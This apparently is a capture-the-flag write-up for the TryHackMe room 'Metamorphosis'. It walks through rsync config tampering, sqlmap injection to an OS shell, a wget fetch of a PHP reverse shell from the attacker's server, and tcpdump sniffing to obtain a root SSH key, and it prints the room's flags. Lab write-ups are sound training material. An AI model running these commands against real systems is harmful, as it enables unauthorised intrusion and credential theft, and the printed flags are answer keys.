---
title: Metmorphosis
layout: post
author: Bit Criminals Team
date: 2021-07-23 20:00:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/metamorphosis
---


On enumerating we get the following five open ports.

![](/images/Mars/meta1.png)  
  
On running gobuster we get
  
![](/images/Mars/meta2.png)  
 
Opening http://[IP]/admin we found

![](/images/Mars/meta3.png)

Checking the source code we found

![](/images/Mars/meta4.png)

Clearly, we had to change the back-end configuration of the website to 'development' mode.

We then used the rsync service available at port 873

On enumerating the rsync service we found this

![](/images/Mars/meta5.png)

We then listed the contents of Conf as follows

![](/images/Mars/meta6.png)

We then brought all the files to our local attack machine as follows

![](/images/Mars/meta7.png)

Checking the contents of each file at random I found the file webapp.ini interesting

![](/images/Mars/meta8.png)

From the hint we found at the source code, we modified the webapp.ini file. We changed the value of 'env' variable from 'prod' to 'dev'

![](/images/Mars/meta9.png)

Then we reuploaded this modified file into the server as follows

![](/images/Mars/meta10.png)

On refreshing the webpage we found this

![](/images/Mars/meta11.png)

In the webapp.ini file we also found a username and password. on using that username here, we find that the password is 'thecat' (we already know)
But given the fact that there is only one input, the next thought was sqlinjection. Thus, we used sqlmap.

We ran the following command and found that the DBMS (Data Base Managament System) was run by mysql

```sqlmap -u http://[ip]/admin/config.php --data=username=tom --level=5 --risk=3```

Then to get the OS shell we ran the following command

```sqlmap -u http://[ip]/admin/config.php --data=username=tom --level=5 --risk=3 --os-shell```

After a long time, we finally got the shell

![](/images/Mars/meta14.png)

We then uploaded a php reverse shell. We uploaded the reverse shell via the http port of the attack machine
The following command was used in the attack machine
```python -m SimpleHTTPServer```
We then collected the payload on the other side using the command
```wget http://[ip of attack machine]:8000/reverse-shell.php```

We then loaded the url 'http://[box ip]/reverse-shell.php' with the suitable port to listen. Thus we got the shell. On simple navigation we found the user flag was

![](/images/Mars.meta13.png)

**4ce794a9d0019c1f684e07556821e0b0**


# Privelage escelation

We tried using the commad
```find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null```
But we didn't figure out how to escelate. So we downloaded linpeas.sh just like the reverse shell and then ran the script. But tihs time also we didn't get useful results. So we tried the 'pspy' script. From the results of this script we understnad that tcpdump was installed in the machine.

Thus we can only capture a packet. So we ran the pspy64 script and set up tcpdump to capture the packets.

For this we used the following command in one of the two separate terminals of the attack machine. Also note that all this was done in the /tmp folder so that things don't get messed up :)

```tcpdump -i lo -v -w capture.png```

By the time we got around 40 packets we stopped the capture. We then copied capture.pcap to the /var/www/html directory as the user is www-data. We then loaded the URL 'http://[box ip]/capture.pcap'. Thus, we could download the captured file.

We then opened the file using wireshark and followed the TCP stream. We found an RSA privet key

![](/images/Mars/meta15.png)

We logged in as root through ssh using this privet key. We became the root!

![](/images/Mars/meta16.png)

**7ffca2ec63534d165525bf37d91b4ff4**
